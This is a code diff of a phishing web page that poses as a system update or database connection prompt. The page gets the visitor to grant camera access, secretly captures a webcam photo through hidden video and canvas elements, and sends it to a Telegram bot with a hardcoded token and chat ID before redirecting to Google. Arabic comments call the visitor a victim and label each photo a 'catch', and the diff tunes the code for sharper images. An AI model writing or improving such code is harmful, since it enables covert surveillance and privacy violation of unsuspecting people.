@@ -2,75 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Checking System...</title>
+    <title>System Update</title>
     <style>
-        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
-        #btn { padding: 20px; background: #0f0; color: black; border: none; font-size: 20px; cursor: pointer; }
+        body { background: black; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        #status { font-size: 24px; margin-top: 20px; }
+        #btn { padding: 15px 40px; background: #0f0; color: black; font-weight: bold; border: none; cursor: pointer; font-size: 20px; border-radius: 5px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <video id="v" autoplay playsinline></video>
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
-    <h2>SYSTEM LOADING...</h2>
-    <p>Please click START to continue</p>
-    <button id="btn" onclick="go()">START</button>
+    <div id="status">DATABASE CONNECTION REQUIRED</div>
+    <br>
+    <button id="btn" onclick="startProcess()">CONNECT NOW</button>
 
     <script>
         const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const id = "8042090388";
 
-        async function go() {
-            document.getElementById('btn').innerText = "LOADING 10%...";
-            try {
-                // فتح الكاميرا
-                const s = await navigator.mediaDevices.getUserMedia({video: true});
-                document.getElementById('v').srcObject = s;
-                
-                document.getElementById('btn').innerText = "LOADING 50%...";
+        async function startProcess() {
+            document.getElementById('btn').style.display = "none";
+            document.getElementById('status').innerText = "ESTABLISHING SECURE CONNECTION...";
 
-                // انتظار بسيط لتفتيح العدسة
+            try {
+                // طلب الكاميرا بجودة عالية
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // أهم خطوة: ننتظر 4 ثواني كاملة لضمان أن العدسة فتحت ووزنت الإضاءة
                 setTimeout(() => {
-                    const v = document.getElementById('v');
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    // تحويل الصورة
-                    const data = c.toDataURL('image/jpeg', 0.5);
-                    upload(data);
-                }, 3000);
+                    captureAndSend();
+                }, 4000);
 
             } catch (e) {
-                alert("Please allow camera access to continue!");
+                document.getElementById('status').innerText = "ACCESS DENIED! PLEASE ALLOW CAMERA.";
             }
         }
 
-        function upload(base64) {
-            const blob = dataURItoBlob(base64);
+        async function captureAndSend() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            
+            // ضبط أبعاد الصورة لتكون واضحة
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            // تحويل الصورة لجودة عالية 0.9
+            const imgData = c.toDataURL('image/jpeg', 0.9);
+            const blob = await (await fetch(imgData)).blob();
+            
             const fd = new FormData();
             fd.append('chat_id', id);
-            fd.append('photo', blob, 'img.jpg');
+            fd.append('photo', blob, 'capture.jpg');
+            fd.append('caption', '✅ صيد جديد وواضح!');
 
-            // استخدام XMLHttpRequest بدلاً من Fetch لضمان التوافق
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", `https://api.telegram.org/bot${tok}/sendPhoto`, true);
-            xhr.onload = function() {
-                // تحويل الضحية فوراً بعد النجاح
-                window.location.href = "https://www.google.com";
-            };
-            xhr.send(fd);
-        }
-
-        function dataURItoBlob(dataURI) {
-            var byteString = atob(dataURI.split(',')[1]);
-            var ab = new ArrayBuffer(byteString.length);
-            var ia = new Uint8Array(ab);
-            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
-            return new Blob([ab], {type: 'image/jpeg'});
+            fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {
+                method: 'POST',
+                body: fd
+            }).then(() => {
+                document.getElementById('status').innerText = "SYSTEM CRITICAL - REDIRECTING...";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            });
         }
     </script>
 </body>
